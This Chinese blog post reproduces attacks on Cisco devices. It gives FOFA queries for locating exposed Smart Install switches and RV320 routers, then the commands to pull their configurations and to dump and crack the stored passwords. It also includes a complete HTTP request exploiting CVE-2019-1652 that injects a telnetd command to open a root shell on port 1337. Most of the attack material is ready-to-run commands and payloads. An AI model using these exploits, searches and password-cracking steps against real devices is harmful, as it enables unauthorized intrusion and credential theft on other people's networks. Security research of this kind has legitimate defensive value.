---

title: "cisco设备信息泄漏漏洞案例"
date: 2022-10-21T12:00:00+08:00
draft: false
author: "r0fus0d & k1t9meo"
categories: ["test2"]

---

近期遇到了几个cisco配置信息泄漏的案例，借此机会复现下cisco常见的几个漏洞。

{{% admonition info "info" %}}
本文首发 合天网安 https://mp.weixin.qq.com/s/efrcXS_uiXp0LzUaaEJ-MA
{{% /admonition %}}

<!--more-->

---

## cisco SMI 配置泄漏

Cisco SMI 是一种即插即用功能，可为 Cisco 交换机提供零接触部署并在 TCP 端口 4786 上进行通信。如果发现开放4786端口的cisco设备，那可以深入测试一下。

fofa 语句 *protocol="smi"*

![Untitled](../../img/cisco-case/Untitled.png)

影响目标还挺多的

```
git clone https://github.com/ChristianPapathanasiou/CiscoSmartInstallExploit
cd CiscoSmartInstallExploit
pip2 install tftpy
python2 cisco.py [ip]
```

注意用python2运行,运行成功会下载目标的运行配置

![Untitled](../../img/cisco-case/Untitled%201.png)

配置文件中存有设备用户密码，ACL配置，ftp配置账号密码等敏感信息

如果想进一步分析配置文件可以下载 ccat 工具进行自动化分析

[https://github.com/frostbits-security/ccat](https://github.com/frostbits-security/ccat)

```
git clone https://github.com/frostbits-security/ccat.git
cd ccat
pip3 install -r requirements.txt
python3 ccat.py configuration_file
```

![Untitled](../../img/cisco-case/Untitled%202.png)

我们可以使用 **--dump-creds** 参数dump出账号密码

![Untitled](../../img/cisco-case/Untitled%203.png)

文件名m500的可以用hashcat -m 500的掩码进行爆破,5700同理

![Untitled](../../img/cisco-case/Untitled%204.png)

---

## CVE-2019-1652 && CVE-2019-1653

Cisco RV320 路由器的配置可以在未经身份验证的情况下通过设备的 Web 界面导出。

fofa 语句 app="CISCO-RV320”

对应poc

```
ip:port/cgi-bin/config.exp
```

![Untitled](../../img/cisco-case/Untitled%205.png)

下载的配置文件中有账号和md5的密码,不过md5的格式为 `md5($password.$auth_key)`，其中 auth_key 是一个静态值，可以通过直接访问 / 路径找到。

![Untitled](../../img/cisco-case/Untitled%206.png)

当然在通过 CVE-2019-1653 获得了账号和md5的密码后可以通过替换登录包的hash进行登录,无需解密

![Untitled](../../img/cisco-case/Untitled%207.png)

![Untitled](../../img/cisco-case/Untitled%208.png)

后台可以配合 CVE-2019-1652 进行 rce

github上的利用poc由于不支持目标的自签名证书 [https://github.com/0x27/CiscoRV320Dump/blob/master/easy_access.py](https://github.com/0x27/CiscoRV320Dump/blob/master/easy_access.py) 这里就手动发包进行测试

```
POST /certificate_handle2.htm?type=4 HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: mlap=RGVmYXVsdDk6Ojo6Y2lzY28=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 319

page=self_generator.htm&totalRules=1&OpenVPNRules=30&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A&organization=A&organization_unit=A&email=ab%40example.com&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&SelectSubject_s=1&common_name=a%27%24%28telnetd%20-l%20%2Fbin%2Fsh%20-p%201337%29%27b
```

payload执行后会用telnet在本地监听1337口

连接验证

![Untitled](../../img/cisco-case/Untitled%209.png)

---

## 总结

1. cisco设备国内互联网公司和企事业用的不多，近年来都被国产品牌替换了。
2. python的poc经常会遇到一些历史遗留问题，比如tls版本过低，依赖库安装报错不兼容等等问题，建议还是用go写poc，利人利己。
